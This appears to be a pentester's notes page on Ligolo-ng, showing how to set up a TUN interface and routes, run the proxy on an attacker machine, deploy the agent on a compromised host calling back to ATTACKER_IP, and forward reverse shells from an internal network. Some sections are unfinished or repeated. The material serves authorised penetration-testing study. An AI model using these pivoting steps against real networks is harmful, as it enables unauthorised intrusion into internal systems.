---
description: >-
  An advanced, yet simple, tunneling tool that uses a TUN interface. Ligolo-ng
  is a simple, lightweight and fast tool that allows pentesters to establish
  tunnels from a reverse TCP/TLS connection using
---

# Ligolo-Ng

{% embed url="https://github.com/tnpitsecurity/ligolo-ng" %}

<figure><img src="../../.gitbook/assets/Untitled Diagram (4).jpg" alt=""><figcaption> A classic scenario for pivoting use cases</figcaption></figure>

### Setting up Ligolo-ng

{% hint style="info" %}
Before running Ligolo-ng, you must create a TUN Interface on the attacker PC so that ligolo can add routes to different sub networks. The idea is that when you have a sub network such as \`192.168.0.0/24\` that is inside the tartget network, you can provide the sub network IP address (which can only be reached from an internal network) to any tool you want.
{% endhint %}

`Creating a Tun Interface`

```
# Before running ligolo-ng proxy, you must create a tuntap virtual interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

<details>

<summary>ligolo-setup-script</summary>

```
#!/bin/bash
me="$(whoami)"
echo "addling ligolo routes to user: $user"

echo "creating the ligolo tun interface"
sudo ip tuntap add user "$me" mode tun ligolo 
sudo ip link set ligolo up

echo "now adding routes $a $b"
a="172.16.0.0/24"
b="192.168.0.0/24"
c="10.10.0.0/24"
sudo ip route add "$a" dev ligolo
echo "done : $a"
sudo ip route add "$b" dev ligolo
echo "done : $b"
sudo ip route add "$c" dev ligolo
echo "done : $c"

echo "fuck off now! :)"
```

</details>

Once you have added the TUN Interface and the sub networks that you want to access from the attacker PC, you can now launch ligolo proxy on the attacker PC and the agent on an already compromised host in the internal network.&#x20;

`Connecting to a Ligolo-Agent`

```
# 1. On the attacking machine :
./proxy -selfcert -laddr 0.0.0.0:9901

# 2. On each compromised host with the network that you want to pivot to
./agent -connect ATTACKER_IP:9901
```

### Agent Binding/Listening

`Agent Binding/listening on ligolo allows you to capture reverse shells from an internal network and forward it through the ligolo connection. You can then launch a netcat/pwncat-cs from the attacking machine seamlessly, give you the impression as if you were already in the target network.`

```
# 1. On the attacking machine :
TODO :)
```

### Use Cases&#x20;

### 1. Accessing the Target Network

Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo allowing an attcker to use their very own tools from the attacking machine.

```
# 1. Follow the ligolo setup process and start the ligolo proxy on the attacking machine 
./proxy -selfcert -laddr 0.0.0.0:9901

# 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
sudo ip route add 192.168.0.0/24 dev ligolo

# 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs

# 4. Initiate a connection from the ligolo agent to the ligolo proxy
./agent -connect ATTACKER_IP:9901

# 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)

# 6. Once selected, type : 
start

//This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel
//Allowing you to use any tool from the attacking maching against the new target machine
```
![image](https://user-images.githubusercontent.com/90450439/221353322-0abc5b8e-01dd-491a-b3f7-0a3b050393ac.png)

### 1.1 Forwarding a reverse shell from the Target Network

```

listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```
![image](https://user-images.githubusercontent.com/90450439/221354631-dbcb392f-af06-49d8-a63c-c5c03201c2cd.png)

### 2. Accessing the Internal Network

Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo allowing an attcker to use their very own tools from the attacking machine.
